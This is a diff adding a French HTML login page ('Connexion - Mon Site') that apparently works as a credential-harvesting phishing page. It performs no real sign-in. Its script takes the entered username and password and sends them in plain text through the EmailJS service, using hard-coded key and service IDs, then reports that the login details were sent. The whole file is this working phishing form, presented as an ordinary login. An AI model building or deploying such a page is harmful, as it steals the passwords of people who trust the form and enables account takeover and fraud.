@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Connexion - Mon Site</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+      margin: 0;
+    }
+    .container {
+      width: 300px;
+      padding: 20px;
+      background-color: #fff;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      border-radius: 8px;
+      text-align: center;
+    }
+    h2 {
+      color: #ff6f61;
+    }
+    .field {
+      margin-bottom: 15px;
+    }
+    .field label {
+      display: block;
+      font-size: 14px;
+      margin-bottom: 5px;
+    }
+    .field input {
+      width: 100%;
+      padding: 10px;
+      font-size: 14px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    .field input[type="submit"] {
+      background-color: #ff6f61;
+      color: #fff;
+      border: none;
+      cursor: pointer;
+    }
+    .field input[type="submit"]:hover {
+      background-color: #e55b4f;
+    }
+  </style>
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2.4.1/dist/email.min.js"></script>
+  <script type="text/javascript">
+    (function() {
+      emailjs.init('g4HTytQL092Xue3Ar'); // Remplacez par votre user ID
+    })();
+  </script>
+</head>
+<body>
+  <div class="container">
+    <h2>Connexion</h2>
+    <form id="loginForm">
+      <div class="field">
+        <label for="username">Nom d'utilisateur</label>
+        <input type="text" id="username" name="username" required>
+      </div>
+      <div class="field">
+        <label for="password">Mot de passe</label>
+        <input type="password" id="password" name="password" required>
+      </div>
+      <div class="field">
+        <input type="submit" value="Se connecter">
+      </div>
+    </form>
+    <div id="confirmation" style="display:none;color:green;">
+      Les informations de connexion ont été envoyées!
+    </div>
+  </div>
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      emailjs.send("service_7xtpexj", "template_izsur1x", {
+        username: username,
+        password: password
+      })
+      .then(function(response) {
+        console.log('SUCCESS!', response.status, response.text);
+        document.getElementById('confirmation').style.display = 'block';
+      }, function(error) {
+        console.log('FAILED...', error);
+      });
+    });
+  </script>
+</body>
+</html>
